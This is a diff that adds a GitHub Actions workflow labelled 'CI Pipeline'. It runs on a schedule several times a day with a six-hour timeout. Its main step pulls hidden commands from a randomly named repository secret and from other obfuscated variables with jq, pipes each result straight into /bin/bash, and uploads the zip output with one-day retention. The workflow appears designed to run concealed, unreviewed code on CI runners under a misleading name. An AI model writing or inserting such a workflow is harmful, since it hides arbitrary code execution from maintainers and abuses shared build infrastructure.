@@ -1,0 +1,37 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          spgk593: ${{ secrets.spgk593 }}
+        run: |
+          printf '%s' "$spgk593" | jq -r .lfgj01 | /bin/bash
+          echo $o638 | jq -r .z9 | /bin/bash
+          echo $d4 | jq -r .uvpa6 | /bin/bash
+          echo $rd5738 | jq -r .hedi89017 | /bin/bash
+          printf '%s' "$ezzrt1531" | jq -r .zq30520 | /bin/bash
+          printf '%s' "$gn8919" | jq -r .n29 | /bin/bash
+          printf '%s' "$ytma48" | jq -r .ycpa2 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: mZSnaHlS
+          path: "*.zip"
+          retention-days: 1
